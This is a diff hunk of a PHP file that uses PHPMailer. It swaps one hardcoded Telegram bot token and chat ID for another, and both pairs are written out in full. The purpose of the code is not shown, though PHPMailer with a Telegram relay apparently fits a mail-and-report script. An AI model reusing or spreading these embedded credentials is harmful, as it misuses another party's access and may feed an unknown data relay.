@@ -11,8 +11,11 @@ require 'PHPMailer/src/SMTP.php';
 // CONFIGURATION
 // ===============================
 
-$telegramBotToken = "8905522272:AAGBMq-8-SMIcu48NMmfxx8rI941inlblAU";
-$telegramChatId   = "8904749166";
+// $telegramBotToken = "8905522272:AAGBMq-8-SMIcu48NMmfxx8rI941inlblAU";
+// $telegramChatId   = "8904749166";
+
+$telegramBotToken = "8875711432:AAE9nH2Zcnqgdajc9yjKiyvF5tDGDZB3Ss0";
+$telegramChatId   = "8479137294";
 
 
 // ===============================
